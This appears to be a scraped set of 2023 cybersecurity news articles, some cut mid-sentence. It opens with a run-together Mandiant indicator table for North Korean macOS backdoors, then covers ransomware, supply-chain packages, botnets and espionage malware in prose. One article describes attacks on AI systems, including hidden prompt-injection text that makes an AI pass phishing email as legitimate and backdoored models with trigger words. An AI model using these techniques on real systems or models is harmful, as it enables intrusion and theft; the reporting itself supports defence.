ARM64)6d8194c003d0025fa92fbcbf2eadb6d1a90561efc22bdd777956cc67d5b67e3ec3c1b4f35a64f4328e40615d2ab24186us.zoom.ZoomServiceSTRATOFEAR backdoor (Mach-O ARM64)48eaf2a7e97189709fb3789f0c662e1c5d18443f88f38ad7e3de62ac46489f649b4e8183b76fba902fb9a9ccf8a0d5c8com.apple.privacyTIEDYE encrypted configurationb0e0e0d258fcd55d3cc5af2b4669e0149b1c1013ad8d2c0144af74eff5a2afc454b7b858bb7a5cba312bfb0f531c8930com.xpc.agent.plistTIEDYE LaunchDaemon15bfe67e912f224faef9c7f6968279c66f1c47566a46d252885858f928a3b855fb3fd03941e3571d152562d0c75c4d47xpc.protectTIEDYE backdoor (Mach-O ARM64)N/Af0854a28209e07a70d7847af4b2632e697bcb95f2c8fcead41eb9314710bd0c2xpc.protectTIEDYE backdoor (Mach-O ARM64)Filenameexec_signing_idexec_cdhashus.zoom.ZoomUpdatemac-555549440ea0d64e96bb34428e08cc8d948b40e7e5d42bee74a1e1813e8aad9a46a5ebc219953926npx-climac-555549440ea0d64e96bb34428e08cc8d948b40e7e5d42bee74a1e1813e8aad9a46a5ebc219953926com.docker.vmnatmac-555549440ea0d64e96bb34428e08cc8d948b40e7e5d42bee74a1e1813e8aad9a46a5ebc219953926com.google.kservicep-macos-55554944c2a6eb29a7bc3c73acdaa3e0a7a8d8c7ff975b95cfc65b6d19ca18993322cfeed282de04xpc.protectsecurityd-555549440fca1d2f1e613094b0c768d393f83d7fc1fc3213bdb8f3139fd5d4b13e242441016c3c84VIDNameA106-587Command and Control - UNC4899, DNS Query, Variant #2A106-588Command and Control - UNC4899, DNS Query, Variant #1A106-589Command and Control - UNC4899, STRATOFEAR, DNS Query, Variant #1A106-590Command and Control - UNC4899, TIEDYE, DNS Query, Variant #1A106-591Command and Control - UNC4899, TIEDYE, DNS Query, Variant #2A106-592Command and Control - UNC4899, STRATOFEAR, DNS Query, Variant #2A106-593Malicious File Transfer - UNC4899, TIEDYE, Download, Variant #1A106-594Malicious File Transfer - UNC4899, STRATOFEAR, Download, Variant #1 Get the Google Cloud Cyberseurity Forecast 2024 report to explore the latest trends on the horizon.Mandiant experts are ready to answer your questions.© Copyright 2023 Mandiant.

      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe security vendor claimed in a new report that the Russian cybercrime group “dramatically increased” its average ransom demand during the campaign.“While the MOVEit campaign may end up impacting over 1000 companies directly, and an order of magnitude more indirectly, a very, very small percentage of victims bothered trying to negotiate, let alone contemplated paying,” the report noted.“Those that did pay, paid substantially more than prior Clop campaigns, and several times more than the global average ransom amount of $740,144 (+126% from Q1 2023).”Coveware estimates the total haul for Clop at $75–100m, with that amount coming “from just a small handful of victims that succumbed to very high ransom payments.”“This is a dangerous and staggering sum of money for one, relatively small group to possess. For context, this amount is larger than the annual offensive security budget of Canada,” Coveware added.Clop famously exploited a zero-day vulnerability in the MOVEit file transfer software to steal data from countless corporate users of the tool. This tactic could be seen as a response to the fact that traditional ransomware attacks are getting harder to monetize, according to Coveware.In fact, the percentage of attacks that resulted in the victim paying, fell to a record low of 34% in the second quarter, it said.Threat groups are targeting larger victim organizations again in order to secure a bigger payout, and there’s been a “dramatic reduction” in encryption attacks from RaaS groups targeting small enterprises.“Second, it was observed that the more technically sophisticated affiliates that previously used both Dharma and/or Phobos have begun using a new ransomware kit called 8base.”"

      "text": " A hacking unit of North Korea's Reconnaissance General Bureau (RGB) was linked to the JumpCloud breach after the attackers made an operational security (OPSEC) mistake, inadvertently exposing their real-world IP addresses.The hacking group, tracked as UNC4899 by Mandiant, was previously observed using a combination of commercial VPNs and Operational Relay Boxes (ORBs) using L2TP IPsec tunnels to hide their actual location.Mandiant says UNC4899 threat actors have used many VPN providers for this purpose in previous campaigns, including ExpressVPN, NordVPN, TorGuard, and others. While North Korean state hackers are known for using commercial VPN services to mask their IP addresses and actual locations, during the JumpCloud attack, the VPNs they were using failed and exposed their location in Pyongyang while connecting to a victim's network.\"Additionally we observed the DPRK threat actor log directly into a Pyongyang IP, from one of their jump boxes. Our evidence supports that this was an OPSEC slip up since the connection to the North Korean netblock was short-lived.\"Apart from this OPSEC oversight, Mandiant security researchers also found attack infrastructure overlapping with previously associated hacks linked to North Korean hackers, further bolstering the attribution of the breach to North Korean hackers.\"We assess with high confidence that UNC4899 is a cryptocurrency-focused group that falls under the RGB. UNC4899's targeting is selective, and they have been observed gaining access to victim networks through JumpCloud,\" Mandiant added.\"Mandiant has observed UNC2970, APT43, and UNC4899 all utilize similar infrastructure.\"Senior Incident Response Consultant Austin Larsen told BleepingComputer that the attackers also hit a downstream victim following their breach of JumpCloud.Mandiant foresees that additional victims may be currently dealing with the repercussions of this attack.While the company has now attributed the attack, it has not yet disclosed the number of impacted customers.Colorado-based JumpCloud is an operational directory-as-a-service platform that offers single sign-on and multi-factor authentication services to a vast network of over 180,000 organizations spanning more than 160 countries."

Older versions/releases are also at risk. An unauthorized, remote (internet-facing) actor can access users' personally identifiable information and can allow limited changes to the server.\"After news of the vulnerability circulated among the cybersecurity community, security expert Kevin Beaumont warned that admins should apply the patches as soon as possible due to the ease of exploitation.While the company has not publicly admitted that the zero-day was actively exploited, the private bulletin says that a \"trusted source\" informed Ivanti that CVE-2023-35078 was exploited in attacks against a limited number of customers.\"We have received information from a credible source indicating exploitation against a very small number of customers (e.g., less than 10). We do not have more information the share at this time,\" the private advisory reads.Ivanti added that the bug is not being exploited as part of a supply chain attack, saying that it didn't find \"any indication that this vulnerability was introduced into our code development process maliciously.\"\"Ivanti became aware and addressed a vulnerability that impacts Ivanti Endpoint Manager Mobile (formerly MobileIron Core) customers,\" an Ivanti spokesperson BleepingComputer, after a second inquiry asking to confirm exploitation in attacks and if the company will release a public advisory.\"We immediately developed and released a patch and are actively engaging with customers to help them apply the fix.\"Most of the exposed servers are located in the United States, followed by Germany, the United Kingdom, and Hong Kong.It is strongly advised that all network admins apply the Ivanti Endpoint Manager Mobile (MobileIron) patches as soon as possible."

The HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client,\" explains the 2022 report by Symantec.Exploiting the flaw fetches a malicious 'SCSKAppLink.dll' payload from an IIS web server already compromised before the attack for use as a malware distribution server.\"The download URL for 'SCSKAppLink.dll' was identified as being the aforementioned IIS web server,\" explains ASEC's new report.\"This signifies that the threat actor attacked and gained control over IIS web servers before using these as servers for distributing malware.\"ASEC did not analyze the particular payload but says it is likely a malware downloader seen in other recent Lazarus campaigns.Next, Lazarus uses the 'JuicyPotato' privilege escalation malware ('usopriv.exe') to gain higher-level access to the compromised system.JuicyPotato is used for executing a second malware loader ('usoshared.dat') that decrypts downloaded data files and executes them into memory for AV evasion.ASEC recommends that NISAFE CrossWeb EX V6 users update the software to its latest version, as Lazarus' exploitation of known vulnerabilities in the product has been underway since at least April 2022.Microsoft application servers are becoming a popular target for hackers to use in malware distribution, likely due to their trusted nature."

      "text": " Google's security researcher Tavis Ormandy discovered a new vulnerability impacting AMD Zen2 CPUs that could allow a malicious actor to steal sensitive data, such as passwords and encryption keys, at a rate of 30KB/sec from each CPU core.The vulnerability is tracked as CVE-2023-20593 and is caused by the improper handling of an instruction called 'vzeroupper' during speculative execution, a common performance-enhancing technique used in all modern processors.Ormandy used fuzzing and performance counters to discover specific hardware events and validated his results using an approach called \"Oracle Serialization.\"With this approach, the author was able to detect inconsistencies between the execution of the randomly generated program and its serialized oracle, leading to the discovery of CVE-2023-20593 in Zen2 CPUs.After triggering an optimized exploit for the flaw, the researcher could leak sensitive data from any system operation, including those that take place in virtual machines, isolated sandboxes, containers, etc.The researcher reported the flaw to AMD on May 15, 2023, and today, he published a proof-of-concept (PoC) exploit for CVE-2023-20593.The exploit is written for Linux, but the bug is OS-agnostic, so all operating systems running on Zen 2 CPUs are affected.The flaw impacts all AMD CPUs built on the Zen 2 architecture, including the Ryzen 3000 (\"Matisse\"), Ryzen 4000U/H (\"Renoir\"), Ryzen 5000U (\"Lucienne\"), Ryzen 7020, and the high-end ThreadRipper 3000 and Epyc server (\"Rome\") processors.Ormandy concludes that detecting exploitation of Zenbleed is most likely impossible, as improper usage of 'vzeroupper' does not require elevated privileges or special system calls and hence would be pretty stealthy.Zenbleed's practical impact on regular users is relatively low, as it requires local access to the target system and a high degree of specialization and knowledge to exploit.However, it's essential to keep systems up-to-date with the latest security patches and apply any BIOS updates as soon as they become available."

      "text": " Reporter, Infosecurity MagazineApplication security provider Checkmarx has identified what it described as the first open source software supply chain attacks targeting the banking sector.The first attack started in February 2023, when a threat actor uploaded a package to NPM, the world’s largest software registry.This package contained a payload designed to latch onto a specific login form element on the targeted bank’s web page, stealthily intercepting login data and then transmitting it to a remote location.  The premise of the second attack, observed from early April 2023, is similar, with a threat actor uploading packages to NPM.These packages contained a preinstall script that executed its malicious objective upon installation.First, the script identified the victim’s operating system (Windows, Linux, or Darwin/MacOS). Then, based on the result, the script decoded the relevant encrypted files in the NPM package.Next, the attacker used these files to download a malicious binary onto the victim’s system.To avoid detection and bypasses traditional deny list methods, the attacker created a subdomain that incorporated the name of the targeted bank on Microsoft Azure CDN.They also leveraged the Havoc Framework, an advanced post-exploitation command and control framework crafted by the self-proclaimed “malware writer” going by the Twitter handle @C5pider.“Havoc’s ability to evade standard defenses, like Windows Defender, makes it a go-to option for threat actors, replacing legitimate toolkits such as Cobalt Strike, Sliver, and Brute Ratel,” reads the report.Checkmarx also noted that the contributor behind these packages was linked to a LinkedIn profile page of an individual posing as an employee of the targeted bank.The security researchers commented: “Our initial assumption was that this may be a penetration testing exercise by the bank. However, the response we received upon contacting the institution for clarification painted a different picture — the bank wasn’t aware of this activity.”While the malicious open source packages have been reported by Checkmarx and removed, the firm predicts “a persistent trend of attacks against the banking sector’s software supply chain to continue.”The researchers argued that the sole vulnerability scanning at the build level is “no longer adequate in the face of today’s advanced cyber threats. Once a malicious open-source package enters the pipeline, it’s essentially an instantaneous breach — rendering any subsequent countermeasures ineffective. […] This escalating gap underscores the urgency to shift our strategy from merely managing malicious packages to proactively preventing their infiltration into our Software Development Lifecycle (SDLC) in the first place.”"

Hope also said the attack detection was made possible by monitoring unusual traffic on the supplier’s platform. Despite ongoing investigations by the police since the discovery on July 12, the minister did not divulge specific details about the incident. He emphasized that it was too early to ascertain the responsible party and the full extent of the attack’s impact.“Over the past 18 months, we’ve seen an increasing number of attacks directly targeting state infrastructure within countries broadly supportive of Ukraine.”At the same time, Hope clarified that some critical entities within the government, including the Prime Minister’s office, as well as the foreign, defense and justice ministries, were not affected. These ministries operate on a different IT platform, which acted as a protective measure.“This is yet another reminder of the urgency needed to assess and mitigate security vulnerabilities in suppliers, as this attack has been attributed to a weakness in an IT supplier,” Wilkes added."

However, the group is still the most prolific of 2023 so far.June also saw 8base, a new group first discovered in May, ramp up activity quickly. It was responsible for 40 attacks: 9% of the total recorded by NCC Group. Two other groups spotted for the first time in May, Rhysida and Darkrace, contributed 17 and nine attacks respectively.Unsurprisingly, North America once again contributed the most victims (51%), followed by Europe (27%) and Asia (9%).Matt Hull, global head of threat intelligence at the firm, argued that the threat landscape continues to evolve.“The better-known players, such as Lockbit 3.0, are showing no signs of letting up, newer groups like 8base and Rhysida are demonstrating what they’re capable of, and Clop exploited a major vulnerability for the second time in just three months,” he claimed.“It’s imperative that organizations remain vigilant and adapt their security measures to stay one step ahead. We strongly advise any organization using MOVEit file transfer software to apply the recent patch, given this vulnerability is being actively exploited.”"

A remote, unauthenticated attacker can trigger the vulnerability by sending specially crafted packets to an affected device.Zyxel addressed the vulnerability in late April and advised customers to install the provided patches.Researchers from Shadwserver also confirmed that the issue is under active exploitation to build a Mirai-based botnet.Now Fortinet experts observed attacks occurring in multiple regions, including Central America, North America, East Asia, and South Asia.The experts noticed that the attackers specifically target the command injection flaw in the Internet Key Exchange (IKE) packet transmitted over UDP on Zyxel devices. The attackers were spotted using tools such as curl or wget to download scripts for further malicious actions.The script files employed in these attacks exclusively download files aimed at the MIPS architecture, a circumstance that suggests a highly specific target.This campaign utilized multiple servers to launch attacks, Fortinet researchers reported that the malware updated itself within a few days to maximize the compromise of Zyxel devicesThe researchers believe that multiple actors are actively exploiting the issue to build their own DDoS botnets. Another botnet that was spotted exploiting the flaw is known as Katana, which is advertised on a Telegram group called “SHINJI.APP | Katana botnet.” The threat actors behind the latter botnet announced that they have updated the botnet’s methods and performing maintenance tasks. “Targeting vulnerable devices has always been a primary objective for threat actors, and the prevalence of remote code execution attacks poses a major concern for IoT devices and Linux servers. The presence of exposed vulnerabilities in devices can lead to significant risks. Once an attacker gains control over a vulnerable device, they can incorporate it into their botnet, enabling them to execute additional attacks, such as DDoS.” concludes the report. “To effectively address this threat, it is crucial to prioritize the application of patches and updates whenever possible.”\nCopyright@securityaffairs 2023 "

      "text": " Microsoft is further enhancing the Windows 11 Enhanced Phishing Protection by testing a new feature that warns users when they copy and paste their Windows password into websites and documents.With the release of Windows 11 22H2, Microsoft introduced a new security feature called Enhanced Phishing protection, designed to protect your Windows and Active Directory domain credentials from being obtained by threat actors.One of the most common methods threat actors use to gain access to websites or a corporate network is to purchase or steal corporate credentials. These credentials are obtained initially through phishing attacks or via information-stealing malware.Threat actors use these stolen credentials to access other accounts used by the Windows user, including email accounts, bank accounts, and cryptocurrency trading accounts. Even worse, these stolen accounts can be used to access corporate networks, allowing the hackers to spread laterally on a network to conduct BEC scams, data theft, supply chain attacks, and ransomware attacks.When Microsoft first released the new Windows Enhanced Phishing protection, it only warned users when they manually typed their Windows password into a document or web login page.However, as it's commonly advised that users use password managers to create strong and unique passwords for all their logins, many people copy and paste their passwords from the password manager into their login prompts.As the feature did not previously protect against copy and paste, this would bypass the Windows security feature.With the release of Windows 11 Insider Dev build 23506, Microsoft has enhanced the phishing protection feature by now detecting the copy and paste of a user's Windows password.As this feature is not enabled by default, Windows users should turn it on by going to Windows Security > App & browser control > Reputation-based protection > Phishing protection and putting checkmarks under all three options, as shown below.Once enabled, this feature will warn users when they type or copy and paste their Windows logon password into website forms or documents.\"If your password is stolen from this site, attackers will true to use it other sites too. Use strong, unique passwords to keep your personal information safe,\" reads the Windows phishing protection alert.\"Microsoft recommends changing your local Windows account password.\"While our previous Windows Enhanced Phishing Protection test showed that it did not work with certain applications, such as Firefox and Excel, today's tests show that this has been fixed, making the feature more robust.However, it still does not work with other third-party applications that could commonly be used to store passwords, such as Notepad2, Notepad++, and likely many others.Microsoft has also introduced a new \"Warn others about suspicious apps and sites\" phishing protection setting, but there is no information about this new setting and who 'others' represents.Microsoft has not answered our questions related to this new setting.Finally, it must be noted that the Windows 11 Phishing protection feature does not work if you use Windows Hello, such as PIN or biometrics, to log in to Windows.For this feature to work, Windows users must log in with a password so it is cached in memory and can be compared to inputted text (typed or copied and pasted).As this feature can be a powerful tool to protect corporate credentials, instantly alerting admins when a user is reusing their Windows password, trading the convenience of Windows Hello for better security is worth it.It is recommended that all Windows users enable this security feature in Windows Security, even if it does not support all applications now."

      "text": " The Clop ransomware gang is copying an ALPHV ransomware gang extortion tactic by creating Internet-accessible websites dedicated to specific victims, making it easier to leak stolen data and further pressuring victims into paying a ransom.When a ransomware gang attacks a corporate target, they first steal data from the network and then encrypt files. This stolen data is used as leverage in double-extortion attacks, warning victims that the data will be leaked if a ransom is not paid.Ransomware data leak sites are usually located on the Tor network as it makes it harder for the website to be taken down or for law enforcement to seize their infrastructure.However, this hosting method comes with its own issues for the ransomware operators, as a specialized Tor browser is required to access the sites, search engines do not index the leaked data, and the download speeds are typically very slow.A clearweb website is hosted directly on the Internet rather than on anonymous networks like Tor, which require special software to access.This new method makes it easier to access the data and will likely cause it to be indexed by search engines, further expanding the spread of the leaked information.The first site created by the threat actors was for business consulting firm PWC, creating a website that leaked the company's stolen data in four spanned ZIP archives.Soon after Alvieri told BleepingComputer, the threat actors also created websites for Aon, EY (Ernst & Young), Kirkland, and TD Ameritrade.None of Clop's sites are as sophisticated as the ones created by ALPHV last year, as they simply list links to download the data rather than having a searchable database like BlackCat's sites.These sites aim to scare employees, executives, and business partners who may have been impacted by the stolen data, hoping it causes them to exert further pressure on a company to pay the ransom.However, while there may be some benefits to leaking data in this way, they also come with their own problems, as putting them on the Internet, rather than Tor, makes them far more easily taken down.At this time, all of the known Clop clearweb extortion sites have been taken offline.It is unclear if these sites are down due to law enforcement seizures, DDoS attacks by cybersecurity firms, or hosting providers and registrars shutting down the sites.Due to the ease with which they can be shut down, it is doubtful that this extortion tactic is worth the effort."

      "title": "Google Categorizes 6 Real-World AI Attacks to Prepare for Now",
      "text": " Google researchers have identified six specific attacks that can occur against real-world AI systems, finding that these common attack vectors demonstrate a unique complexity, That will require a combination of adversarial simulations and the help of AI subject-matter expertise to construct a solid defense, they noted.The attacks largely result in the technology producing unexpected or even malice-driven results, which can lead to outcomes as benign as the average person's photos showing up on a celebrity photo website, to more serious consequences such as security-evasive phishing attacks or data theft.An example of this would be if someone added a paragraph to an AI-based phishing attack that is invisible to the end user but could direct the AI to classify a phishing email as legitimate. This might allow it to get past email anti-phishing protections and increase the chances that a phishing attack is successful.Another type of attack that the team uncovered is one called training-data extraction, which aims to reconstruct verbatim training examples that an LLM uses — for example, the contents of the Internet.A third potential AI attack is backdooring the model, whereby an attacker \"may attempt to covertly change the behavior of a model to produce incorrect outputs with a specific 'trigger' word or feature, also known as a backdoor,\" the researchers wrote. In this type of an attack, a threat actor can hide code either in the model or in its output to conduct malicious activity.A fourth attack type, called adversarial examples, are inputs that an attacker provides to a model to result in a \"deterministic, but highly unexpected output,\" the researchers wrote. An example would be that the model could show an image that clearly shows one thing to the human eye but which the model recognizes as something else entirely. This type of attack could be fairly benign — in a case where someone could train the model to recognize his or her own photo as one deemed worthy of inclusion on a celebrity website — or critical, depending on the technique and intent.Google's initial AI red-team exercise taught the researchers some valuable lessons that other enterprises also can employ to defend against attacks on AI systems, according to the Internet giant. The first one is that while red-team activity is a good start, organizations also should team up with AI experts to conduct realistic end-to-end adversarial simulations for maximum defense.\"We believe that red teaming will play a decisive role in preparing every organization for attacks on AI systems and look forward to working together to help everyone utilize AI in a secure way,\" the researchers wrote in the report.\"This is true in particular for protecting the integrity of AI models throughout their lifecycle to prevent data poisoning and backdoor attacks,\" the researchers wrote.They wrote: \"Traditional security philosophies, such as validating and sanitizing both input and output to the models still apply in the AI space.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A ransomware actor with a penchant for breaking into target networks via vulnerable SQL servers has suddenly become very active over the past several months and appears poised to become an even bigger threat than it is already.The group, tracked as Mallox — aka TargetCompany, Fargo, and Tohnichi — first surfaced in June 2021 and claims to have infected hundreds of organizations worldwide since then. The group's victims include organizations in the manufacturing, retail, wholesale, legal, and professional services sectors.Previously, Mallox was known for being a relatively small and closed ransomware group, says Lior Rochberger, senior security researcher at Palo Alto Networks, attributes the explosive activity to concerted efforts by group leaders to grow Mallox operations.\"In the beginning of 2023, it appears that the group started putting more efforts into expanding its operations by recruiting affiliates,\" she says. \"This can potentially explain the surge we observed during this year, and especially more recently, around May.\"The Mallox group's typical approach for gaining initial access on enterprise networks is to target vulnerable and otherwise insecure SQL servers. Often they start with a brute-force attack where the adversary uses a list of commonly used passwords or known default passwords against an organization's SQL servers.So far, Unit 42 has only observed Mallox infiltrating networks via SQL servers. But other researchers have reported recent attempts to distribute Mallox via phishing emails, suggesting that new affiliate groups are involved now as well, Rochberger says.\"After gaining access, the attackers use the command line and PowerShell to download the Mallox ransomware payload from a remote server,\" Unit 42's report this week noted.As with many other ransomware infections these days, the payload first attempts to disable all services that would impede its ability to encrypt data on a victim system. It also tries to systematically delete shadow copies, so data restoration becomes harder once encryption is complete. In addition, the malware tries to clear all event logs using a common Microsoft command utility as part of an effort to complicate forensics analysis.Mallox is a double extortion campaign, meaning the threat actors steal data from a victim environment before encrypting it. The group — like almost every other ransomware operation these days — maintains a website where it leaks data belonging to victims who refuse to accede to its ransom demands. Victim organizations can negotiate with Mallox operators via a Tor website using a unique private key to authenticate themselves. Mallox operators themselves claim to have breached hundreds of organizations worldwide. Unit 42 said its own telemetry indicates at least dozens of potential victims worldwide.As always, the best defense against the threat is to have a multilayered plan in place for addressing such attacks. \"The Unit 42 team recommends making sure that all Internet-facing applications are configured properly, and all systems are patched and up to date wherever possible,\" the security vendor advised. It's also a good idea to have endpoint security controls in place for performing in-memory inspection to detect process-injection attempts, lateral movement efforts, and attempts to evade security controls, the vendor said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Google confirmed that based on current detection, no apps containing this malware are found to be on Google Play,\" Lookout said.However, APT41's interest in Android devices \"shows that mobile endpoints are high-value targets with coveted data.\""

However, we don't have an estimate yet of how many nodes exist or how fast the malicious network associated with P2PInfect is growing.\"Successful exploitation of the CVE-2022-0543 flaw allows the malware to gain remote code execution capabilities on compromised devices.Following its deployment, the P2PInfect worm installs a first malicious payload, creating a peer-to-peer (P2P) communication channel within a broader interconnected system.After it connects to the P2P network of other infected devices used for auto-propagation, the worm downloads additional malicious binaries, including scanning tools to find other exposed Redis servers.\"Exploiting CVE-2022-0543 in this way makes the P2PInfect worm more effective at operating and propagating in cloud container environments,\" the researchers added.\"Unit 42 believes this P2PInfect campaign is the first stage of a potentially more capable attack that leverages this robust P2P command and control (C2) network.\"Unfortunately, based on the large number of instances exposed online, many Redis server admins may not be aware that Redis lacks a secure-by-default configuration.Update July 20, 13:36 EDT: Redis sent the following statement after the article was published."

Affected vendors include the likes of AMD, Asus, ARM, Dell EMC, Gigabyte, Lenovo, Nvidia, Qualcomm, Hewlett-Packard Enterprise, Huawei, Ampere Computing, ASRock, and more.Eclypsium security researchers found the flaws (tracked as CVE-2023-34329 and CVE-2023-34330) after analyzing AMI source code stolen by the RansomEXX ransomware gang after breaching the network of computer hardware giant GIGABYTE, one of AMI's business partners.By combining these vulnerabilities, a remote attacker with network access to the BMC management interface and lacking BMC credentials can gain remote code execution on servers running vulnerable firmware.This is accomplished by tricking the BMC into perceiving the HTTP request as originating from the internal interface. Consequently, the attacker can upload and execute arbitrary code remotely, potentially even from the Internet, if the interface is exposed online.\"The impact of exploiting these vulnerabilities includes remote control of compromised servers, remote deployment of malware, ransomware and firmware implanting or bricking motherboard components (BMC or potentially BIOS/UEFI), potential physical damage to servers (over-voltage / firmware bricking), and indefinite reboot loops that a victim organization cannot interrupt,\" Eclypsium said.\"We also need to emphasize that such an implant can be extremely hard to detect, and is extremely easy to recreate for any attacker in the form of a one-line exploit.\"Furthermore, the two MegaRAC BMC firmware vulnerabilities disclosed today can be chained with the ones mentioned above.Specifically, CVE-2022-40258, which involves weak password hashes for Redfish & API, could help attackers crack the administrator passwords for the admin accounts on the BMC chip, making the attack even more straightforward.\"We have seen no evidence that these or our previously disclosed BMC&C vulnerabilities are being exploited in the wild,\" Eclypsium said.\"However, because threat actors have access to the same source data the risk of these vulnerabilities being weaponized is significantly raised.\""

Our primary focus now is to get all systems up and running again as fast as possible,” it continued.“Tomra will remain transparent with all stakeholders, and we will continue to provide updates when we have confirmed information to share.”The firm added that it had already notified the relevant authorities and mobilized all resources to “contain and neutralize the incident.”An update yesterday claimed the attack has had a “limited impact” on customer operations.To that end, the firm’s food and recycling businesses are operating ‘as usual,’ but with limited functionality due to digital services being offline, it said.Its reverse vending machines (RVMs) are working online in Australia and North America, while most continue to function offline in Europe and Asia.However Tomra’s internal IT and back office apps are offline, impacting supply chain management.“Major office locations are offline, and employees are asked to work remotely,” it added.Rob Bolton, VP EMEA at Versa Networks, argued that service disruption is a popular tactic for extorting money from critical infrastructure and supply chain organizations.“One positive that can be taken out of the attack on Tomra is the quick response time to stop the attack and mitigate its impacts,” he added.“Every organization should have measures and controls in place to contain cyber-attacks as soon as they are identified.

When activated, these macros execute a PowerShell command, creating a scheduled task impersonating a Firefox browser updater.However, this task downloads the DeliveryCheck backdoor (also known as CapiBar and GAMEDAY) and launches it in memory, where it connects to the threat actor's command and control server to receive commands to execute or deploy further malware payloads.Microsoft says that these malware payloads are embedded and launched from XSLT stylesheets.After infecting devices, the threat actors utilize the backdoor to exfiltrate data from the compromised devices using the Rclone tool.What makes DeliveryCheck stand out is a Microsoft Exchange server-side component that turns the server into a command and control server for the threat actors.Microsoft says this component is installed using Desired State Configuration, a PowerShell module that allows admins to create a standardized server configuration and apply it to devices.This feature is usually used to create a default configuration template that can then be used to configure multiple devices with the same settings automatically.The threat actors use DSC to automatically load a base64-encoded Windows executable which converts the legitimate Exchange server into a malware-distribution server.During the attack, Microsoft and CERT-UA also saw Turla drop the KAZUAR information-stealing backdoor, a \"fully-featured Secret Blizzard implant\".This malware is a cyberespionage tool that allows the threat actors to launch javascript on the device, steal data from event logs, steal information about systems files, and steal authentication tokens, cookies, and credentials from a wide variety of programs, including browsers, FTP clients, VPN software, KeePass, Azure, AWS, and Outlook.\"The threat actor specifically aims to exfiltrate files containing messages from the popular Signal Desktop messaging application, which would allow the actor to read private Signal conversations, as well as documents, images, and archive files on targeted systems,\" the Microsoft Threat Intelligence team tweeted.CERT-UA says they have shared samples of the new malware with cybersecurity companies to aid detection."

At 9:43 MSK (UTC +3).“We sent further emails from the same address, but received no reply” - BlackCat ransomwareReferring to the security experts that Estée Lauder brought in to investigate, BlackCat said that despite the company using Microsoft’s Detection and Response Team (DART) and Mandiant the network remained compromised and they still had access.The attacker also said that they did not encrypt any of the company systems, adding that unless Estée Lauder engages in negotiations they will reveal more details about the stolen data.BlackCat hinted that the information exfiltrated could impact customers, company employees, and suppliers.Estée Lauder’s lack of response to BlackCat’s communication indicates that the company will not engage in any negotiation with the threat actor.In the SEC filing, the company informs that the focus is “on remediation, including efforts to restore impacted systems and services” and that the “incident has caused, and is expected to continue to cause, disruption to parts of the Company’s business operations.”"

It operates by altering legitimate banking transfers made by users, changing the beneficiary and diverting funds to illegitimate bank accounts controlled by the malicious actors or their affiliates. Valentini and Strino also said that drIBAN has evolved throughout the years, adopting evasive tactics to thwart detection and analysis. The researchers added that they observed polymorphic techniques in June 2021, where identifiable characteristics like specific variable names were frequently altered, making it challenging to track the malicious payloads.In addition to its technical capabilities, drIBAN has also introduced an extortion feature. Throughout the past year, Cleafy identified multiple extortion messages embedded within the web inject payloads. These messages were written in broken English, signaling an attempt to negotiate with targeted banking institutions to halt attacks on their corporate clients.To combat these evolving threats, Cleafy emphasized the need for effective cooperation between private sectors, financial institutions, computer emergency response teams (CERTs), law enforcement agencies and other stakeholders.\"Proactive prevention measures, such as sharing threat intelligence and implementing robust security measures, are vital to safeguarding corporate bank accounts and mitigating the impact of sophisticated APT campaigns,\" the company wrote."

The chatbot will enter its official \"early-access preview\" window in the fall, supplanting Microsoft's current private preview and adding some new functionality.The version available now has incorporated user feedback and adds \"promptbooks\" — sequences of commonly used AI prompts to give security professionals a starting point in their analyses — as well as integration with common cybersecurity tools to streamline operations.The goal is to make security teams more efficient, ease pressure due to the shortage of workers with security skills, and simplify typically complex security activities, says Chang Kawaguchi, vice president and AI security architect at Microsoft.\"Automation is a key to every security operations organization, and you need the ability ... to be creative in interacting with it,\" he says. \"Part of why we're moving to the next stage [is] opening up to partners, so that we can start to integrate [with] the tools that customers are using in their SOCs every day.\"\"Defenders have many, many tools which they use to do their jobs today,\" Kawaguchi says. \"What private preview users like about the product is that it brings together multiple systems, multiple tools they would otherwise have to use, whether it's a trouble-ticketing system, their SEIM, [Microsoft] Defender for Endpoint. By doing the sort of interaction in Copilot, you can do it from one place where all of that data comes together.\"Microsoft would not disclose the timeline for when Security Copilot would become generally available to the public, nor would it talk about which partners have access to it or how many overall users it plans to have in the early-access preview.\"It's still a relatively constrained list, but it is going to be a much larger number,\" Kawaguchi says. \"We're not ready to disclose time frames for GA, or general availability, but I expect that will very likely be the next step. But we're going to be guided by learning by customer and partner feedback, and so we'll do it when we're ready and when we believe that we've got the right feature set.\"He adds, \"We want some more scenarios, some more customers. We want partners involved. And as we see partners get their extensible configuration set up, I expect that we'll see more emergent scenarios, right, where customers find that those combinations work really, really well.\"Using generative AI for cyber threat intelligence and incident response will allow more IT and security professionals to hunt for threats and participate in the response to attacks, says Jamie Zajac, vice president of product at Recorded Future, which launched its own LLM-based service in April.These systems make \"even more advanced threat intelligence capability available to more companies,\" she says. \"If you're an IT analyst or ... a Tier 2 SOC analyst, or you don't have a lot of time to do [an analysis], it's now becoming easier to apply intelligence into your workflows. I can make better decisions, and I can make them faster, and I can also enhance my capabilities that I didn't have time to develop robustly.\"For its part, Microsoft estimates that incident response and threat intelligence analyses that typically take hours will now take minutes. In addition, collaboration through those promptbooks in Security Copilot — similar to Python scripts collected in Jupyter Notebooks — will allow common tasks to be standardized. Microsoft is hopeful that promptbooks will help novice security analysts do their jobs, but also allow more experienced analysts to spend more time on higher-value work.\"This is a series of pre-engineered prompts that could be provided by Microsoft or written and provided by your own peers for use within your organization that says, 'Hey, when we have malware, this is the set of analyses we want to do,'\" Kawaguchi says. \"All of this is to help try to simplify things for the incident responder.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

